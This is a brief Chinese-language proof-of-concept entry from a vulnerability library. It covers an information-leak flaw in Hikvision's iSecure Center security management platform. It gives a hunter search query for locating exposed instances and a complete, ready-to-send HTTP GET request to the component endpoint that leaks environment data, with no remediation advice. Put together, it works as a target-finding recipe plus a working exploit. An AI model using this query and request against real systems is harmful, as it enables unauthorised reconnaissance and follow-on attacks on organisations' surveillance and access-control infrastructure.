# 海康威视iSecure Center综合安防管理平台findcomponent泄漏漏洞

# 一、漏洞简介
HIKVISION 综合安防管理平台component存在信息泄漏漏洞，攻击者通过漏洞可以获取环境等敏感信息进一步攻击。

# 二、影响版本
+ HIKVISION 综合安防管理平台

# 三、<font style="color:rgb(0, 0, 0);">资产测绘</font>
**hunter查询语法：**

`app.name=="Hikvision 海康威视 iSecure Center"`


+ 登录页面


# 四、漏洞复现
```java
GET /bic/caService/v1/certificate/machine/component HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qf3ftbtmhnukggpy>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
